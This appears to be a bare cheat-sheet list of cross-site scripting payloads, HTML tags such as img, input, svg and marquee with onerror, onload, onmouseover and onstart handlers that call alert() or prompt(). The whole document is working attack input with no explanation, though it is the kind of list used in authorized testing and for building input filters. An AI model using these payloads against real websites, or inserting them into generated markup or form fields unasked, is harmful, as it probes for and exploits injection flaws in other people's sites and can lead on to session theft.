```
<input type=image src onerror=prompt(1)>
<input type=image src onerror="alert(1)">

<img src=xss onerror=alert(1)>
<img src =q onerror=prompt(8)>
<IMG SRC=# onmouseover="alert('xss')">
<img/src/onerror=alert(1)>

<svg/onload=alert(1)>
<marquee/onstart=alert(1)>
```
